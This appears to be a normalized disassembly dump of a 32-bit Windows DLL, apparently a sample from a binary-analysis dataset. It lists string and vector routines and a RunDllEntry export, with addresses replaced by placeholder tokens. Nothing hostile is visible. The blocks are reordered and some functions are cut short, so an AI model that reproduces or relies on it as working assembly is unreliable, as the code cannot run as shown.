sub_10001066
push 0x4
mov eax sub_10026c37
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_100107f5
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100016de
mov eax esi
call sub_100142eb
retn 0x4
sub_10001127
push 0x4
mov eax sub_10026c37
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10010876
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100016de
mov eax esi
call sub_100142eb
retn 0x4
sub_10001161
push 0x24
mov eax sub_10027631
call sub_10014213
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push edi
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] ebx
call sub_1000145d
mov esi r--data
mov [ ebp - 0x4 ] ebx
push esi
mov [ ebp - 0x2c ] 0x1
call sub_10010a1b
pop ecx
lea edx [ edi + 0x6c ]
mov ecx esi
call sub_10001d21
mov esi r--data
push esi
call sub_10010a1b
pop ecx
lea edx [ edi + 0x88 ]
mov ecx esi
call sub_10001d21
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
xor esi esi
lea ecx [ ebp - 0x28 ]
inc esi
lea eax [ edi + 0xa4 ]
push ecx
mov [ ebp - 0x4 ] esi
call sub_1000185c
push ebx
push esi
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
lea eax [ edi + 0xa4 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea ecx [ edi + 0x50 ]
call sub_1000195e
push r--data
lea ecx [ edi + 0x34 ]
call sub_1000195e
mov esi r--data
push esi
call sub_10010a1b
pop ecx
lea edx [ edi + 0x18 ]
mov ecx esi
call sub_10001d21
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x3
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x4
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x5
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x6
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x7
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x8
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x9
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov [ ebp - 0x4 ] 0xa
mov eax esi
push eax
mov eax edi
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0xb
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0xc
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0xd
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0xe
call sub_1000185c
push ebx
push 0x1
mov [ ebp - 0x4 ] bl
call sub_10001a52
push r--data
lea esi [ ebp - 0x28 ]
call sub_1000170e
mov eax esi
push eax
mov eax edi
mov [ ebp - 0x4 ] 0xf
call sub_1000185c
push ebx
push 0x1
call sub_10001a52
mov eax edi
call sub_100142eb
retn
sub_1000145d
push 0x0
mov eax sub_100272cb
call sub_10014213
mov edi [ ebp + 0x8 ]
push edi
call sub_10001766
and [ ebp - 0x4 ] 0x0
push 0x7
lea eax [ edi + 0x18 ]
pop ebx
xor ecx ecx
mov [ eax + 0x18 ] ebx
call sub_10001e05
lea esi [ edi + 0x34 ]
call sub_100016a9
lea esi [ edi + 0x50 ]
call sub_100016a9
lea eax [ edi + 0x6c ]
xor ecx ecx
mov [ eax + 0x18 ] ebx
call sub_10001e05
lea eax [ edi + 0x88 ]
xor ecx ecx
mov [ eax + 0x18 ] ebx
call sub_10001e05
lea eax [ edi + 0xa4 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10001766
mov eax edi
call sub_100142eb
retn 0x4
sub_100014cd
push ebx
push esi
lea esi [ edi + 0xa4 ]
call sub_10001b71
push [ esi ]
call sub_10010ba2
pop ecx
xor ebx ebx
push ebx
push 0x1
lea esi [ edi + 0x88 ]
call sub_10001a52
push ebx
push 0x1
lea esi [ edi + 0x6c ]
call sub_10001a52
push ebx
push 0x1
lea ecx [ edi + 0x50 ]
call sub_1000197b
push ebx
push 0x1
lea ecx [ edi + 0x34 ]
call sub_1000197b
push ebx
push 0x1
lea esi [ edi + 0x18 ]
call sub_10001a52
mov esi edi
call sub_10001b71
push [ edi ]
call sub_10010ba2
pop ecx
pop esi
pop ebx
retn
sub_10001530
push 0x0
mov eax sub_100272cb
call sub_10014213
mov ebx ecx
mov edi [ ebp + 0x8 ]
push ebx
push edi
call sub_1000179f
and [ ebp - 0x4 ] 0x0
lea eax [ ebx + 0x18 ]
push eax
lea esi [ edi + 0x18 ]
call sub_10001738
lea eax [ ebx + 0x34 ]
push eax
lea ecx [ edi + 0x34 ]
mov [ ebp - 0x4 ] 0x1
call sub_100016de
lea eax [ ebx + 0x50 ]
push eax
lea ecx [ edi + 0x50 ]
mov [ ebp - 0x4 ] 0x2
call sub_100016de
lea eax [ ebx + 0x6c ]
push eax
lea esi [ edi + 0x6c ]
mov [ ebp - 0x4 ] 0x3
call sub_10001738
lea eax [ ebx + 0x88 ]
push eax
lea esi [ edi + 0x88 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001738
add ebx 0xa4
push ebx
lea eax [ edi + 0xa4 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1000179f
mov eax edi
call sub_100142eb
retn 0x4
RunDllEntry
push 0x8
push r--data
call sub_10018984
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100189c9
retn
push eax
call sub_1000a3ac
jmp r-xdata
sub_100015f4
push 0xc4
mov eax sub_10027d5a
call sub_10014213
and [ ebp - 0x10 ] 0x0
push 0x184
call sub_10010c96
pop ecx
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
lea edi [ ebp - 0xd0 ]
call sub_10001161
mov [ ebp - 0x4 ] 0x1
push [ ebp - 0x14 ]
mov ecx eax
mov [ ebp - 0x10 ] 0x1
call sub_1000263d
jmp r-xdata
push [ rw-data ]
call sub_1000a358
call sub_100142eb
retn
lea edi [ ebp - 0xd0 ]
call sub_100014cd
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ rw-data ] eax
je r-xdata
sub_100016de
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_10001ca7
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_100018cc
mov eax esi
pop esi
retn 0x4
sub_10001766
push 0x0
mov eax sub_10026d50
call sub_10014213
mov esi [ esp + 0x24 ]
push 0x4
call sub_10010c96
pop ecx
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] ecx
mov eax esi
call sub_100142eb
retn 0x4
sub_1000179f
push 0x14
mov eax sub_10027585
call sub_10014246
push 0x4
call sub_10010c96
mov edi [ ebp + 0x8 ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov eax edi
call sub_100142eb
retn 0x8
call sub_10001b48
cmp al bl
je r-xdata
mov [ edi ] eax
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov ebx [ esi + 0x10 ]
mov edi esi
lea esi [ ebp - 0x18 ]
call sub_10002127
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x20 ]
call sub_10002127
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
xor eax eax
lea edi [ ebp + 0xc ]
stosb [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ecx
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
call sub_100024fe
add esp 0x10
mov [ esi + 0x10 ] eax
mov edi esi
sub_1000185c
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ecx [ edi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop esi
idiv esi
mov esi eax
xor esi esi
jmp r-xdata
lea esi [ ebp - 0xc ]
call sub_10002127
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
push eax
mov eax edi
call sub_10001a99
push [ ebp + 0x8 ]
push 0x1
push ebx
call sub_10001b96
mov [ edi + 0x10 ] eax
jmp r-xdata
mov ebx [ edi + 0x10 ]
mov eax ebx
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
cmp eax esi
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_100018cc
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_1000f9fc
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_10001cc3
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_10001c38
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_10001c38
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
add edi edx
push edi
push ecx
push eax
call sub_1000102e
add esp 0x10
push esi
mov ecx ebx
call sub_10001ca7
sub_1000197b
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10001ca7
pop esi
retn 0x8
cmp [ esi + 0x18 ] 0x10
jb r-xdata
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_10010ba2
pop ecx
pop edi
push [ esp + 0x10 ]
push edi
push 0x10
push eax
call sub_1000102e
add esp 0x10
sub_100019c6
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
cmp [ ebx + 0x14 ] eax
jae r-xdata
mov edi [ ebx + 0x14 ]
mov eax [ ebp + 0x8 ]
sub edi eax
cmp [ ebp + 0xc ] edi
jae r-xdata
call sub_1000f9fc
cmp esi ebx
jne r-xdata
mov edi [ ebp + 0xc ]
call sub_10001e1d
test al al
je r-xdata
push 0xffffffff
add edi eax
call sub_10001d8a
push [ ebp + 0x8 ]
xor edi edi
call sub_10001d8a
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x18 ]
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0x8 ]
lea edx [ ebx + edx * 2 ]
push edx
push ecx
push eax
mov eax edi
call sub_100023dd
add esp 0xc
mov ecx edi
mov eax esi
call sub_10001e05
sub_10001a52
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esi + 0x18 ] 0x7
call sub_10001e05
retn 0x8
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ esp + 0x8 ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_10010ba2
pop ecx
pop edi
push edi
push 0x8
push eax
mov eax [ esp + 0x18 ]
call sub_100023dd
add esp 0xc
sub_10001a99
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ebx
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
jne r-xdata
lea esi [ ebp - 0x8 ]
call sub_10002127
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] eax
jmp r-xdata
call sub_10010b92
cmp eax [ ebp - 0x8 ]
je r-xdata
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10001e6c
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10002127
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0xc ]
mov ebx edi
mov [ ebp - 0xc ] esi
test edi edi
jne r-xdata
mov ecx [ edi ]
jmp r-xdata
call sub_10010b92
xor ecx ecx
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x4 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
imul eax eax 0x1c
add esi eax
cmp esi [ ecx + 0x10 ]
ja r-xdata
call sub_10010b92
test edi edi
je r-xdata
xor edi edi
mov edi [ edi ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] ebx
pop ebx
leave
retn 0x10
cmp esi [ edi + 0xc ]
jae r-xdata
sub_10001b48
push esi
mov esi eax
cmp esi 0x9249249
jbe r-xdata
mov ecx esi
call sub_100020dd
imul esi esi 0x1c
add esi eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] esi
mov al 0x1
pop esi
retn
call sub_1000585e
sub_10001b96
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000247f
mov eax [ ebp + 0xc ]
imul eax eax 0x1c
add esp 0x14
add eax [ ebp + 0x8 ]
pop edi
leave
retn 0xc
sub_10001bc6
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10002241
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_10001cc3
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_100018cc
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_1000102e
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_10001ca7
sub_10001c38
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_1000f9fc
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ebx edx
mov ebx [ edx ]
jmp r-xdata
sub eax [ ebp + 0xc ]
add ebx edi
add ebx [ ebp + 0xc ]
push eax
push ebx
sub ecx edi
push ecx
add edx edi
push edx
call sub_1000104a
mov eax [ esi + 0x14 ]
sub eax [ ebp + 0xc ]
add esp 0x10
push eax
mov ecx esi
call sub_10001ca7
pop ebx
mov edx [ edx ]
cmp ecx 0x10
jb r-xdata
sub_10001cc3
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xfffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_1000f9c4
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_1000215f
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push edi
mov ecx esi
call sub_10001ca7
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_1000197b
jmp r-xdata
mov eax edi
sub_10001d21
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
push ebx
mov ecx esi
mov edi eax
call sub_10002357
test al al
je r-xdata
call sub_10001e1d
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub ebx eax
push edi
sar ebx 0x1
push ebx
mov eax esi
mov ecx esi
call sub_100019c6
jmp r-xdata
push ebx
push ecx
push eax
mov eax edi
call sub_100023dd
add esp 0xc
mov ecx edi
mov eax esi
call sub_10001e05
sub_10001d8a
push ebp
mov ebp esp
push ecx
push ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0x8 ]
jae r-xdata
call sub_1000f9fc
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov [ ebp + 0x8 ] eax
mov eax esi
leave
retn 0x4
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ ebp - 0x4 ] edx
mov ebx [ edx ]
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
sub eax ebx
add eax eax
push eax
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x4 ]
lea eax [ edi + ebx ]
lea eax [ edx + eax * 2 ]
push eax
mov eax [ ebp - 0x8 ]
sub ecx edi
add ecx ecx
push ecx
lea eax [ eax + edi * 2 ]
push eax
call sub_10010798
mov ecx [ esi + 0x14 ]
add esp 0x10
sub ecx ebx
mov eax esi
call sub_10001e05
pop ebx
mov edx [ edx ]
cmp ecx 0x8
jb r-xdata
sub_10001e1d
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_1000f9c4
test edi edi
jne r-xdata
push [ esi + 0x14 ]
push edi
push esi
call sub_1000227c
jmp r-xdata
xor eax eax
cmp eax edi
sbb eax eax
neg eax
retn
xor ecx ecx
mov eax esi
call sub_10001e05
sub_10001e6c
push 0x50
mov eax sub_10027558
call sub_100142b2
mov eax [ ebp + 0x8 ]
mov edi ecx
mov ecx [ edi + 0xc ]
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x5c ] eax
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop esi
idiv esi
mov ebx eax
xor ebx ebx
jmp r-xdata
lea edx [ eax + 0x1 ]
cmp ebx edx
jae r-xdata
call sub_1000585e
mov esi [ edi + 0x10 ]
mov eax esi
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
mov ecx 0x9249249
mov edx ecx
sub edx eax
cmp edx 0x1
jae r-xdata
mov eax esi
sub eax [ ebp + 0x10 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x5c ]
cmp eax 0x1
jae r-xdata
mov eax ebx
shr eax 0x1
sub ecx eax
cmp ecx ebx
jae r-xdata
lea esi [ ebp - 0x4c ]
call sub_10001738
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
lea ebx [ esi - 0x1c ]
push esi
mov edx esi
mov ecx ebx
call sub_100023fc
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov edi eax
cmp eax ebx
je r-xdata
lea esi [ ebp - 0x30 ]
call sub_10001738
push 0x2
pop esi
mov [ ebp - 0x4 ] esi
mov ecx [ ebp + 0x10 ]
push [ edi + 0x10 ]
lea edx [ ecx + 0x1c ]
call sub_100023fc
mov [ ebp - 0x4 ] 0x3
mov ecx [ edi + 0x10 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax ecx
sub eax [ ebp + 0x10 ]
push 0x1c
pop ebx
cdq
idiv ebx
xor edx edx
inc edx
sub edx eax
push edx
push ecx
call sub_10001b96
mov [ ebp - 0x4 ] esi
add [ edi + 0x10 ] ebx
mov edi [ edi + 0x10 ]
lea esi [ edi - 0x1c ]
mov edi [ ebp + 0x10 ]
jmp r-xdata
add ebx eax
xor ebx ebx
jmp r-xdata
lea edi [ eax + 0x1c ]
mov esi eax
cmp eax edi
je r-xdata
sub esi ebx
cmp edi esi
jne r-xdata
mov ecx ebx
call sub_100020dd
mov esi eax
mov eax [ ebp + 0x10 ]
sub eax [ edi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x5c ]
and [ ebp - 0x58 ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x1
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x50 ] eax
imul eax eax 0x1c
add eax esi
push eax
call sub_10001b96
push [ ebp + 0x10 ]
mov ecx [ edi + 0xc ]
mov edx esi
mov [ ebp - 0x58 ] 0x1
call sub_100023fc
mov edx [ ebp - 0x50 ]
push [ edi + 0x10 ]
mov ecx [ ebp + 0x10 ]
inc edx
imul edx edx 0x1c
add edx esi
mov [ ebp - 0x58 ] 0x2
call sub_100023fc
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ecx
push 0x1c
cdq
pop esi
idiv esi
mov esi eax
inc esi
test ecx ecx
je r-xdata
mov ebx edx
cmp ebx edx
jae r-xdata
lea esi [ ebp - 0x4c ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x4c ]
mov ecx esi
call sub_100019c6
add esi 0x1c
cmp esi edi
jne r-xdata
sub ebx 0x1c
lea eax [ esi + ebx ]
push eax
mov ecx ebx
call sub_100025d6
pop ecx
cmp ebx edi
jne r-xdata
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x30 ]
mov ecx edi
call sub_100019c6
add edi 0x1c
lea esi [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x54 ]
imul ebx ebx 0x1c
imul esi esi 0x1c
add ebx eax
add esi eax
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi + 0xc ] eax
jmp r-xdata
push [ edi + 0x10 ]
mov eax ecx
call sub_10001e51
push [ edi + 0xc ]
call sub_10010ba2
pop ecx
push 0x0
push 0x1
call sub_10001a52
call sub_1001430e
retn 0xc
sub_10001f81
cmp [ ebp - 0x58 ] 0x1
jle r-xdata
xor esi esi
cmp [ ebp - 0x58 ] esi
jle r-xdata
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x54 ]
imul ecx ecx 0x1c
add ecx eax
push ecx
call sub_10001e51
push [ ebp - 0x54 ]
call sub_10010ba2
pop ecx
push esi
push esi
call sub_10013de1
mov eax esi
sub eax [ ebp + 0x10 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x5c ]
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x50 ]
lea ecx [ eax + 0x1 ]
imul eax eax 0x1c
add eax [ ebp - 0x54 ]
imul ecx ecx 0x1c
add ecx [ ebp - 0x54 ]
push ecx
call sub_10001e51
lea esi [ ebp - 0x4c ]
call sub_10001738
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
lea ebx [ esi - 0x1c ]
push esi
mov edx esi
mov ecx ebx
call sub_100023fc
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov edi eax
cmp eax ebx
je r-xdata
lea esi [ ebp - 0x30 ]
call sub_10001738
push 0x2
pop esi
mov [ ebp - 0x4 ] esi
mov ecx [ ebp + 0x10 ]
push [ edi + 0x10 ]
lea edx [ ecx + 0x1c ]
call sub_100023fc
mov [ ebp - 0x4 ] 0x3
mov ecx [ edi + 0x10 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax ecx
sub eax [ ebp + 0x10 ]
push 0x1c
pop ebx
cdq
idiv ebx
xor edx edx
inc edx
sub edx eax
push edx
push ecx
call sub_10001b96
mov [ ebp - 0x4 ] esi
add [ edi + 0x10 ] ebx
mov edi [ edi + 0x10 ]
lea esi [ edi - 0x1c ]
mov edi [ ebp + 0x10 ]
jmp r-xdata
lea edi [ eax + 0x1c ]
mov esi eax
cmp eax edi
je r-xdata
sub esi ebx
cmp edi esi
jne r-xdata
lea esi [ ebp - 0x4c ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x4c ]
mov ecx esi
call sub_100019c6
add esi 0x1c
cmp esi edi
jne r-xdata
sub ebx 0x1c
lea eax [ esi + ebx ]
push eax
mov ecx ebx
call sub_100025d6
pop ecx
cmp ebx edi
jne r-xdata
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x30 ]
mov ecx edi
call sub_100019c6
add edi 0x1c
lea esi [ ebp - 0x30 ]
jmp r-xdata
push 0x0
push 0x1
call sub_10001a52
call sub_1001430e
retn 0xc
sub_100020dd
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1c
jae r-xdata
xor ecx ecx
imul ecx ecx 0x1c
push ecx
call sub_10010c96
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_10010806
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10013de1
int3
sub_10002127
and [ esi ] 0x0
test edi edi
je r-xdata
call sub_10010b92
cmp [ edi + 0xc ] ebx
ja r-xdata
cmp ebx [ edi + 0x10 ]
jbe r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov eax esi
retn
sub_1000215f
push 0xc
mov eax sub_10026c14
call sub_10014246
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push 0x0
push eax
call sub_1000241d
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
push 0xfffffffe
pop eax
sub eax edx
cmp ecx eax
ja r-xdata
